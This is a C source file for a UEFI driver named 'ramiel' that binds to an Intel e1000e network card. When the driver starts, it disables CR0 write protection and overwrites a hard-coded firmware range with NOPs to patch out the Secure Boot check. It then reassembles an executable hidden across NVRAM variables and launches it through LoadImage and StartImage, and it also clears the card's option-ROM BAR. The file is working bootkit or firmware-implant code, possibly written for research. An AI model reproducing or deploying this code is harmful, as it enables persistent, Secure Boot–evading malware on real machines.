#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/PrintLib.h>
#include <IndustryStandard/Pci.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/UefiDevicePathLib/UefiDevicePathLib.h>
#include <Library/BaseMemoryLib.h>
#include <Protocol/ComponentName.h>
#include <Protocol/ComponentName2.h>
#include <Protocol/DriverBinding.h>
#include <Protocol/PciIo.h>
#include <Register/Intel/Msr.h>

#define PATCH_START 0x000000007ef94dbdu
#define PATCH_END 0x000000007ef94eabu

// #define APPLICATION_VAR_NAME L"application"
// #define APPLICATION_VAR_GUID {0x2C299EB5, 0x7424, 0x4580, {0xA1, 0xC7, 0x22, 0xFB, 0xDB, 0x8A, 0x71, 0x13}}

// length of XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
#define GUID_LEN 36

#define GUIDS_VAR_NAME L"guids"
#define GUIDS_VAR_GUID {0xBFB35F7E, 0xFC44, 0x41AE, {0x7C, 0xD9, 0x68, 0xA8, 0x01, 0x02, 0xB9, 0xD0}}

// https://bsdio.com/edk2/docs/master/_boot_android_boot_img_8c_source.html
typedef struct {
  MEMMAP_DEVICE_PATH          Node1;
  EFI_DEVICE_PATH_PROTOCOL    End;
} MEMORY_DEVICE_PATH;

STATIC CONST MEMORY_DEVICE_PATH  MemoryDevicePathTemplate =
{
    {
        {
            HARDWARE_DEVICE_PATH,
            HW_MEMMAP_DP,
            {
                (UINT8)(sizeof (MEMMAP_DEVICE_PATH)),
                (UINT8)((sizeof (MEMMAP_DEVICE_PATH)) >> 8),
            },
        }, // Header
        0, // StartingAddress (set at runtime)
        0  // EndingAddress   (set at runtime)
    }, // Node1
    {
        END_DEVICE_PATH_TYPE,
        END_ENTIRE_DEVICE_PATH_SUBTYPE,
        { sizeof (EFI_DEVICE_PATH_PROTOCOL), 0 }
    } // End
};

void clear_cr0_wp() {
    AsmWriteCr0(AsmReadCr0() & ~(1UL << 16));
}

void set_cr0_wp() {
    AsmWriteCr0(AsmReadCr0() | (1UL << 16));
}

void patch_sb() {
    // https://github.com/tianocore/edk2/blob/master/UefiCpuPkg/PiSmmCpuDxeSmm/SmmCpuMemoryManagement.c#L111
    Print(L"[ramiel]: patch_sb - patching secureboot check from -> %llx to %llx...\n", PATCH_START, PATCH_END);
    clear_cr0_wp();
    SetMem((VOID *) PATCH_START, PATCH_END - PATCH_START, 0x90);
    set_cr0_wp();
    Print(L"[ramiel]: patch_sb - completed\n");

}

UINTN parse_guids(CHAR16 ***var_names_ptr, UINT8 *buf, UINTN bufsize) {
    UINTN nguids = (bufsize / sizeof(CHAR16)) / GUID_LEN;
    CHAR16 **guids = AllocateZeroPool(nguids * sizeof(CHAR16 *));
    *var_names_ptr = guids;

    for (UINTN i = 0; i < nguids; i++) {
        CHAR16 *tmp = AllocateZeroPool((GUID_LEN * sizeof(CHAR16)) + sizeof(CHAR16)); // null terminated
        guids[i] = tmp;
        CopyMem(tmp, buf + (i * GUID_LEN * sizeof(CHAR16)), GUID_LEN * sizeof(CHAR16));
    }

    return nguids;
}

EFI_STATUS
EFIAPI
nvram_chainload() {
    EFI_STATUS status;

    // set variable runtime access to false !!
    UINT8 *buf;
    UINTN bufsize;
    EFI_GUID guids_var_guid = GUIDS_VAR_GUID;
    gRT->GetVariable(
        GUIDS_VAR_NAME,
        &guids_var_guid,
        NULL,
        &bufsize,
        NULL);

    buf = AllocateZeroPool(bufsize);

    gRT->GetVariable(
        GUIDS_VAR_NAME,
        &guids_var_guid,
        NULL,
        &bufsize,
        buf);

    CHAR16 **var_names;
    UINTN nguids = parse_guids(&var_names, buf, bufsize);

    EFI_GUID *guids = AllocateZeroPool(nguids * sizeof(EFI_GUID));

    for (int i = 0; i < nguids; i++) {
        Print(L"[ramiel]: nvram_chainload - guid %s\n", var_names[i]);
        StrToGuid(var_names[i], &guids[i]);
    }

    UINT64 size = 0;
    UINT64 *sizes = AllocateZeroPool(nguids * sizeof(UINT64));

    for (int i = 0; i < nguids; i++) {
        gRT->GetVariable(
            var_names[i],
            &(guids[i]),
            NULL,
            &(sizes[i]),
            NULL
        );
        size += sizes[i];
    }

    UINT8 *application_ptr = AllocatePages(EFI_SIZE_TO_PAGES(size));

    UINT64 offset = 0;
    for (int i = 0; i < nguids; i++) {
        gRT->GetVariable(
            var_names[i],
            &(guids[i]),
            NULL,
            &(sizes[i]),
            application_ptr + offset);
        offset += sizes[i];
    }

    MEMORY_DEVICE_PATH mempath = MemoryDevicePathTemplate;
    mempath.Node1.StartingAddress = (EFI_PHYSICAL_ADDRESS) (UINTN) application_ptr;
    mempath.Node1.EndingAddress = (EFI_PHYSICAL_ADDRESS) ((UINTN) application_ptr) + size;

    EFI_HANDLE NewImageHandle;
    status = gBS->LoadImage(
        0,
        gImageHandle,
        (EFI_DEVICE_PATH_PROTOCOL *) &mempath,
        application_ptr,
        size,
        &NewImageHandle);
    if (EFI_ERROR(status)) {
        Print(L"[ramiel]: nvram_chainload - LoadImage failed with status %d\n", status);
        return status;

    }

    Print(L"[ramiel]: nvram_chainload - LoadImage of target completed\n");

    status = gBS->StartImage(NewImageHandle, NULL, NULL);
    if (EFI_ERROR(status)) {
        Print(L"[ramiel]: nvram_chainload - StartImage failed with status %d\n", status);
        return status;
    }

    Print(L"[ramiel]: nvram_chainload - StartImage completed\n");

    return status;
}

EFI_STATUS
EFIAPI
clear_oprom_bar(EFI_PCI_IO_PROTOCOL *PciIo) {
    EFI_STATUS status;
    PCI_TYPE00 Pci;

    // https://lkml.iu.edu/hypermail/linux/kernel/1509.2/06385.html
    UINT32 allones = 0x00000000;
    status = PciIo->Pci.Write(PciIo,                      // (protocol, device)
                                                          // handle
                             EfiPciIoWidthUint32,         // access width & copy
                                                          // mode
                             0x30,                        // Offset
                             1,                           // Count
                             &allones                     // target buffer
    );

    if (EFI_ERROR(status)) {
        Print(L"[ramiel]: could not write expansion rom bar");
        return status;
    }

    status = PciIo->Pci.Read(PciIo,                       // (protocol, device)
                                                          // handle
                             EfiPciIoWidthUint32,         // access width & copy
                                                          // mode
                             0,                           // Offset
                             sizeof Pci / sizeof(UINT32), // Count
                             &Pci                         // target buffer
    );
    if (EFI_ERROR(status)) {
        Print(L"[ramiel]: DriverStart - could not read expansion rom bar");
        return status;
    }

    Print(L"[ramiel]: DriverStart - vendor id, device id -> %x, %x\n", Pci.Hdr.VendorId, Pci.Hdr.DeviceId);
    Print(L"[ramiel]: DriverStart - xrombar -> %x\n", Pci.Device.ExpansionRomBar);
    Print(L"[ramiel]: DriverStart - command register -> %x\n", Pci.Hdr.Command);

    return status;
}

EFI_STATUS
EFIAPI
print_var_info() {
    EFI_STATUS status;
    UINT64 max_var_storage;
    UINT64 remaining_var_storage;
    UINT64 max_var_size;
    status = gRT->QueryVariableInfo(EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
                                    &max_var_storage,
                                    &remaining_var_storage,
                                    &max_var_size
    );

    Print(L"[ramiel]: print_var_info - max_var_storage -> %ld B\n", max_var_storage);
    Print(L"[ramiel]: print_var_info - remaining_var_storage -> %ld B\n", remaining_var_storage);
    Print(L"[ramiel]: print_var_info - max_var_size -> %ld B\n", max_var_size);

    return status;
}

EFI_STATUS
EFIAPI
DriverStart(IN EFI_DRIVER_BINDING_PROTOCOL *This, IN EFI_HANDLE Controller,
            IN EFI_DEVICE_PATH_PROTOCOL *RemainingDevicePath) {
    EFI_STATUS status;

    status = print_var_info();
    if (EFI_ERROR(status)) {
        return status;
    }

    // driverstart got called twice because of virtio nic
    EFI_PCI_IO_PROTOCOL *PciIo;
    status = gBS->OpenProtocol(Controller, &gEfiPciIoProtocolGuid,
                               (VOID **) &PciIo, This->DriverBindingHandle,
                               Controller, EFI_OPEN_PROTOCOL_BY_DRIVER);
    if (EFI_ERROR(status) || PciIo == NULL) {
       return status;
    }

    status = clear_oprom_bar(PciIo);
    if (EFI_ERROR(status)) {
        return status;
    }

    gBS->CloseProtocol(Controller, &gEfiPciIoProtocolGuid,
                       This->DriverBindingHandle, Controller);

    patch_sb();
    status = nvram_chainload();
    return status;
}

BOOLEAN Checke1000eNIC(EFI_HANDLE Controller,
                       EFI_DRIVER_BINDING_PROTOCOL **This) {
    EFI_STATUS status = EFI_SUCCESS;
    EFI_PCI_IO_PROTOCOL *PciIo;

    PCI_TYPE00 Pci;
    status = gBS->OpenProtocol(Controller, &gEfiPciIoProtocolGuid,
                               (VOID **) &PciIo, (*This)->DriverBindingHandle,
                               Controller, EFI_OPEN_PROTOCOL_BY_DRIVER);
    if (EFI_ERROR(status) || PciIo == NULL) {
        return FALSE;
    }
    status = PciIo->Pci.Read(PciIo,                       // (protocol, device)
                                                          // handle
                             EfiPciIoWidthUint32,         // access width & copy
                                                          // mode
                             0,                           // Offset
                             sizeof Pci / sizeof(UINT32), // Count
                             &Pci                         // target buffer
    );


    gBS->CloseProtocol(Controller, &gEfiPciIoProtocolGuid,
                       (*This)->DriverBindingHandle, Controller);

    if (status == EFI_SUCCESS) {
        if (Pci.Hdr.VendorId == 0x8086 && Pci.Hdr.DeviceId == 0x10d3) {
            return TRUE;
        } else {
            return FALSE;
            }
        }
    return FALSE;
}

// https://edk2-docs.gitbook.io/edk-ii-uefi-driver-writer-s-guide/18_pci_driver_design_guidelines/readme.3/1831_supported
EFI_STATUS
EFIAPI
DriverSupported(IN EFI_DRIVER_BINDING_PROTOCOL *This, IN EFI_HANDLE Controller,
                IN EFI_DEVICE_PATH_PROTOCOL *RemainingDevicePath) {

    EFI_DEVICE_PATH_PROTOCOL *this = DevicePathFromHandle(Controller);
    if (this == NULL) {
        return EFI_UNSUPPORTED;
    }

    CHAR16 *p = ConvertDevicePathToText(this, TRUE, FALSE);

    if (Checke1000eNIC(Controller, &This)) {
        Print(L"[ramiel]: nic found @ DevicePath: %s\n", p);
        return EFI_SUCCESS;
    } else {
        return EFI_UNSUPPORTED;
    }
}

EFI_STATUS
EFIAPI
DriverStop(IN EFI_DRIVER_BINDING_PROTOCOL *This, IN EFI_HANDLE Controller,
           IN UINTN NumberOfChildren, IN EFI_HANDLE *ChildHandleBuffer) {
    return EFI_SUCCESS;
}

EFI_DRIVER_BINDING_PROTOCOL gTestDriverBinding = {
    DriverSupported,        DriverStart, DriverStop,
    0x01, NULL,        NULL};

EFI_STATUS EFIAPI DriverEntry(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable) {
    gST = SystemTable;
    gBS = SystemTable->BootServices;
    gRT = SystemTable->RuntimeServices;
    gImageHandle = ImageHandle;

    EFI_STATUS status;
    status = EfiLibInstallDriverBindingComponentName2(
                ImageHandle,         // ImageHandle
                SystemTable,         // SystemTable
                &gTestDriverBinding, // DriverBinding
                ImageHandle,         // DriverBindingHandle
                NULL, NULL);
    return status;
}
